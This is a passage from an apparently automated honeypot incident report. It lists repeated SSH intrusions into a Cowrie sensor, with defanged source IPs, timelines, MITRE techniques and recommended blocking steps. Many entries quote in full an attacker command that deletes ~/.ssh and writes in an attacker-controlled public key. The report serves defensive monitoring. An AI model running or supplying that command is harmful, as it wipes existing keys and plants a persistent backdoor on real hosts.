| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:51:51` | `cowrie.session.connect` |
| `2026-06-01 09:51:51` | `cowrie.client.version` |
| `2026-06-01 09:51:51` | `cowrie.client.kex` |
| `2026-06-01 09:51:53` | `cowrie.login.success` |
| `2026-06-01 09:51:53` | `cowrie.session.params` |
| `2026-06-01 09:51:53` | `cowrie.command.input` |
| `2026-06-01 09:51:53` | `cowrie.command.failed` |
| `2026-06-01 09:51:54` | `cowrie.log.closed` |
| `2026-06-01 09:51:54` | `cowrie.session.params` |
| `2026-06-01 09:51:54` | `cowrie.command.input` |
| `2026-06-01 09:51:54` | `cowrie.session.file_download` |
| `2026-06-01 09:51:54` | `cowrie.log.closed` |
| `2026-06-01 09:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7da42633d92

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:51 |
| **Last Seen** | 2026-06-01 09:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:51:57` | `cowrie.session.connect` |
| `2026-06-01 09:51:57` | `cowrie.client.version` |
| `2026-06-01 09:51:58` | `cowrie.client.kex` |
| `2026-06-01 09:51:59` | `cowrie.login.success` |
| `2026-06-01 09:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fd7854e0d18

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:51 |
| **Last Seen** | 2026-06-01 09:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:51:58` | `cowrie.session.connect` |
| `2026-06-01 09:51:58` | `cowrie.client.version` |
| `2026-06-01 09:51:58` | `cowrie.client.kex` |
| `2026-06-01 09:51:59` | `cowrie.login.success` |
| `2026-06-01 09:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89fcd7700d01

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:53 |
| **Last Seen** | 2026-06-01 09:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:53:34` | `cowrie.session.connect` |
| `2026-06-01 09:53:34` | `cowrie.client.version` |
| `2026-06-01 09:53:34` | `cowrie.client.kex` |
| `2026-06-01 09:53:36` | `cowrie.login.success` |
| `2026-06-01 09:53:36` | `cowrie.session.params` |
| `2026-06-01 09:53:36` | `cowrie.command.input` |
| `2026-06-01 09:53:36` | `cowrie.command.failed` |
| `2026-06-01 09:53:37` | `cowrie.log.closed` |
| `2026-06-01 09:53:37` | `cowrie.session.params` |
| `2026-06-01 09:53:37` | `cowrie.command.input` |
| `2026-06-01 09:53:38` | `cowrie.session.file_download` |
| `2026-06-01 09:53:38` | `cowrie.log.closed` |
| `2026-06-01 09:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f65a9c6a1d1d

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 09:53 |
| **Last Seen** | 2026-06-01 09:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:53:35` | `cowrie.session.connect` |
| `2026-06-01 09:53:36` | `cowrie.client.version` |
| `2026-06-01 09:53:36` | `cowrie.client.kex` |
| `2026-06-01 09:53:38` | `cowrie.login.success` |
| `2026-06-01 09:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-431a3d67dd00

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:53 |
| **Last Seen** | 2026-06-01 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:53:41` | `cowrie.session.connect` |
| `2026-06-01 09:53:41` | `cowrie.client.version` |
| `2026-06-01 09:53:41` | `cowrie.client.kex` |
| `2026-06-01 09:53:42` | `cowrie.login.success` |
| `2026-06-01 09:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c2e4cd2ae15

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:54 |
| **Last Seen** | 2026-06-01 09:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:54:08` | `cowrie.session.connect` |
| `2026-06-01 09:54:08` | `cowrie.client.version` |
| `2026-06-01 09:54:08` | `cowrie.client.kex` |
| `2026-06-01 09:54:10` | `cowrie.login.success` |
| `2026-06-01 09:54:10` | `cowrie.session.params` |
| `2026-06-01 09:54:10` | `cowrie.command.input` |
| `2026-06-01 09:54:10` | `cowrie.command.failed` |
| `2026-06-01 09:54:10` | `cowrie.log.closed` |
| `2026-06-01 09:54:11` | `cowrie.session.params` |
| `2026-06-01 09:54:11` | `cowrie.command.input` |
| `2026-06-01 09:54:11` | `cowrie.session.file_download` |
| `2026-06-01 09:54:11` | `cowrie.log.closed` |
| `2026-06-01 09:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd885e0cfe5d

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:54 |
| **Last Seen** | 2026-06-01 09:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:54:16` | `cowrie.session.connect` |
| `2026-06-01 09:54:16` | `cowrie.client.version` |
| `2026-06-01 09:54:16` | `cowrie.client.kex` |
| `2026-06-01 09:54:17` | `cowrie.login.success` |
| `2026-06-01 09:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-734647757d37

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:55 |
| **Last Seen** | 2026-06-01 09:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:55:40` | `cowrie.session.connect` |
| `2026-06-01 09:55:40` | `cowrie.client.version` |
| `2026-06-01 09:55:40` | `cowrie.client.kex` |
| `2026-06-01 09:55:42` | `cowrie.login.success` |
| `2026-06-01 09:55:42` | `cowrie.session.params` |
| `2026-06-01 09:55:42` | `cowrie.command.input` |
| `2026-06-01 09:55:42` | `cowrie.command.failed` |
| `2026-06-01 09:55:43` | `cowrie.log.closed` |
| `2026-06-01 09:55:43` | `cowrie.session.params` |
| `2026-06-01 09:55:43` | `cowrie.command.input` |
| `2026-06-01 09:55:43` | `cowrie.session.file_download` |
| `2026-06-01 09:55:43` | `cowrie.log.closed` |
| `2026-06-01 09:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e671a88f66e0

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:55 |
| **Last Seen** | 2026-06-01 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:55:47` | `cowrie.session.connect` |
| `2026-06-01 09:55:47` | `cowrie.client.version` |
| `2026-06-01 09:55:47` | `cowrie.client.kex` |
| `2026-06-01 09:55:48` | `cowrie.login.success` |
| `2026-06-01 09:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8e01657c059

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:56 |
| **Last Seen** | 2026-06-01 09:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:56:34` | `cowrie.session.connect` |
| `2026-06-01 09:56:34` | `cowrie.client.version` |
| `2026-06-01 09:56:34` | `cowrie.client.kex` |
| `2026-06-01 09:56:35` | `cowrie.login.success` |
| `2026-06-01 09:56:36` | `cowrie.session.params` |
| `2026-06-01 09:56:36` | `cowrie.command.input` |
| `2026-06-01 09:56:36` | `cowrie.command.failed` |
| `2026-06-01 09:56:36` | `cowrie.log.closed` |
| `2026-06-01 09:56:37` | `cowrie.session.params` |
| `2026-06-01 09:56:37` | `cowrie.command.input` |
| `2026-06-01 09:56:37` | `cowrie.session.file_download` |
| `2026-06-01 09:56:37` | `cowrie.log.closed` |
| `2026-06-01 09:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0170781bd91

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:56 |
| **Last Seen** | 2026-06-01 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:56:41` | `cowrie.session.connect` |
| `2026-06-01 09:56:41` | `cowrie.client.version` |
| `2026-06-01 09:56:41` | `cowrie.client.kex` |
| `2026-06-01 09:56:43` | `cowrie.login.success` |
| `2026-06-01 09:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04597749c996

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:57 |
| **Last Seen** | 2026-06-01 09:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:57:29` | `cowrie.session.connect` |
| `2026-06-01 09:57:29` | `cowrie.client.version` |
| `2026-06-01 09:57:29` | `cowrie.client.kex` |
| `2026-06-01 09:57:30` | `cowrie.login.success` |
| `2026-06-01 09:57:31` | `cowrie.session.params` |
| `2026-06-01 09:57:31` | `cowrie.command.input` |
| `2026-06-01 09:57:31` | `cowrie.command.failed` |
| `2026-06-01 09:57:32` | `cowrie.log.closed` |
| `2026-06-01 09:57:32` | `cowrie.session.params` |
| `2026-06-01 09:57:32` | `cowrie.command.input` |
| `2026-06-01 09:57:32` | `cowrie.session.file_download` |
| `2026-06-01 09:57:32` | `cowrie.log.closed` |
| `2026-06-01 09:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dec03067850a

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:57 |
| **Last Seen** | 2026-06-01 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:57:36` | `cowrie.session.connect` |
| `2026-06-01 09:57:36` | `cowrie.client.version` |
| `2026-06-01 09:57:36` | `cowrie.client.kex` |
| `2026-06-01 09:57:37` | `cowrie.login.success` |
| `2026-06-01 09:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-036bb363fd38

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:59 |
| **Last Seen** | 2026-06-01 09:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:59:09` | `cowrie.session.connect` |
| `2026-06-01 09:59:09` | `cowrie.client.version` |
| `2026-06-01 09:59:09` | `cowrie.client.kex` |
| `2026-06-01 09:59:10` | `cowrie.login.success` |
| `2026-06-01 09:59:11` | `cowrie.session.params` |
| `2026-06-01 09:59:11` | `cowrie.command.input` |
| `2026-06-01 09:59:11` | `cowrie.command.failed` |
| `2026-06-01 09:59:11` | `cowrie.log.closed` |
| `2026-06-01 09:59:12` | `cowrie.session.params` |
| `2026-06-01 09:59:12` | `cowrie.command.input` |
| `2026-06-01 09:59:12` | `cowrie.session.file_download` |
| `2026-06-01 09:59:12` | `cowrie.log.closed` |
| `2026-06-01 09:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-448a3d06d366

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:59 |
| **Last Seen** | 2026-06-01 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:59:15` | `cowrie.session.connect` |
| `2026-06-01 09:59:15` | `cowrie.client.version` |
| `2026-06-01 09:59:16` | `cowrie.client.kex` |
| `2026-06-01 09:59:17` | `cowrie.login.success` |
| `2026-06-01 09:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d215c4b64f3

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:59 |
| **Last Seen** | 2026-06-01 09:59 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:59:16` | `cowrie.session.connect` |
| `2026-06-01 09:59:18` | `cowrie.client.version` |
| `2026-06-01 09:59:18` | `cowrie.client.kex` |
| `2026-06-01 09:59:19` | `cowrie.login.success` |
| `2026-06-01 09:59:20` | `cowrie.session.params` |
| `2026-06-01 09:59:20` | `cowrie.command.input` |
| `2026-06-01 09:59:20` | `cowrie.command.failed` |
| `2026-06-01 09:59:20` | `cowrie.log.closed` |
| `2026-06-01 09:59:21` | `cowrie.session.params` |
| `2026-06-01 09:59:21` | `cowrie.command.input` |
| `2026-06-01 09:59:21` | `cowrie.session.file_download` |
| `2026-06-01 09:59:21` | `cowrie.log.closed` |
| `2026-06-01 09:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c561d58001

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:59 |
| **Last Seen** | 2026-06-01 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:59:26` | `cowrie.session.connect` |
| `2026-06-01 09:59:26` | `cowrie.client.version` |
| `2026-06-01 09:59:26` | `cowrie.client.kex` |
| `2026-06-01 09:59:27` | `cowrie.login.success` |
| `2026-06-01 09:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c87797d6f5a

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 10:00 |
